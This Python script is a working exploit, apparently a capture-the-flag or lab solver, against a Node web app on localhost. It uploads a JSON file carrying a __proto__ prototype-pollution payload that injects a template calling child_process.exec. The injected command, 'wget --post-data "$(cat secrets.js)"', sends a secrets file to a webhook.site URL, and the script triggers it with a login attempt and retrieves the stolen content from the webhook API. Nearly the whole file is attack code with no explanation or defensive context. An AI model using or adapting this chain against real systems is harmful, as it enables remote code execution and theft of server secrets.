#!/usr/bin/env python3

import json
import io
import time

import requests

USERNAME = "test"
PASSWORD = "test1234"
SERVER_PORT = "http://localhost:31467"
WEBHOOK_API = "https://webhook.site"
WEBHOOK_TOKEN = "e97be5a7-3275-4096-bbd9-5fbfbaab8f07" # Update accordingly


def register(session, base, username, password):
    r = session.post(
        f"{base}/signup",
        data={
            "username": username,
            "password": password,
            "password2": password,
        },
        allow_redirects=False,
    )


def build_payload(username, webhook_token, cmd):
    webhook_url = f"https://webhook.site/{webhook_token}"
    cmd = (
        f"wget --post-data \"$({cmd})\" {webhook_url}"
    )
    template = (
        f"${{require('child_process').exec('{cmd}')}}"
    )
    return [
        {
            "lcUsername": username,
            "__proto__": {"userAutoCreateTemplate": template},
        }
    ]
    
def upload_payload(session, base, payload):
    body = json.dumps(payload).encode()

    file_obj = io.BytesIO(body)
    file_obj.name = "payload.json"

    r = session.post(
        f"{base}/upload/users",
        files={
            "upload-users": (
                file_obj.name,
                file_obj,
                "application/json"
            )
        },
        allow_redirects=False,
    )
        
    return r

def trigger(session, base):
    r = session.post(
        f"{base}/login",
        data={"username": "nonexistentuser", "password": "1"},
        allow_redirects=False,
    )


def fetch_latest_webhook(webhook_token):
    for i in range(3):
        r = requests.get(
            f"{WEBHOOK_API}/token/{webhook_token}/requests",
            params={"sorting": "newest", "per_page": 1},
            timeout=30,
        )
        r.raise_for_status()
        data = r.json().get("data") or []
        if not data:
            time.sleep(0.1)
            continue
        return data[0]
    else:
        raise RuntimeError()


def main() -> int:
    session = requests.Session()
    register(session, SERVER_PORT, USERNAME, PASSWORD)

    cmd = "cat secrets.js"
    payload = build_payload(USERNAME, WEBHOOK_TOKEN, cmd)
    print(payload)
    '''
    [{
        "lcUsername": "test",
        "username": "test",
        "__proto__": {
            "userAutoCreateTemplate": "${require('child_process').exec('wget --post-data \"$(cat secrets.js)\" {your-webhook}')}"
        }
    }]
    '''
    upload_payload(session, SERVER_PORT, payload)
    trigger(session, SERVER_PORT)

    time.sleep(1)

    req = fetch_latest_webhook(WEBHOOK_TOKEN)
    print(json.dumps(req, indent=2))

    content = req.get("content") or ""
    if content:
        print("\n[+] body:\n", content)
    return 0


if __name__ == "__main__":
    try:
        main()
    except Exception:
        print("Restart server, you have successfully crashed it")
        pass
